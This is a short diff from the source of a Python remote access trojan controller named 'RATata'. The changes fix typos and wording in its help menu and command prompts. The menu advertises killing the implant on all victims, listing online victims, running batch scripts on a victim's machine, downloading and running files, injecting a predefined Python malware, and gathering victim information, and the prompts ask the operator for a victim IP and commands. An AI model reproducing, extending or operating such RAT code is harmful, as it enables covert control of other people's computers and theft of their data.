@@ -67,7 +67,7 @@ help = """
  [ACTIONS]
           kill          Exit every victims RAT
           ping          Display the online victims
-          bash          Execute batch script on the victim's DOS        
+          bash          Execute batch script on the target's machine        
           dwl           Download & run a file
           inject        Run a predefine python malwware on the victime  
           userinfo      Display infomation over a victim
@@ -231,12 +231,12 @@ def run(url_edit, url_raw):
 
 # ===================<< CMD START >>===================
 def cmd(url_edit, url_raw):
-  ip = input(f"\n {Fore.RED}RATata> commande> ip_adress>{Fore.RESET} ")
+  ip = input(f"\n {Fore.RED}RATata> command> ip_adress>{Fore.RESET} ")
   vari = ip
   stop(vari)
   print("""
  [?] You can separe commands with a ', ' ex: 'color a, tree' """)
-  text = input(f"\n {Fore.RED}RATata> commande>{Fore.RESET} ")
+  text = input(f"\n {Fore.RED}RATata> command>{Fore.RESET} ")
   vari = text
   stop(vari)
 
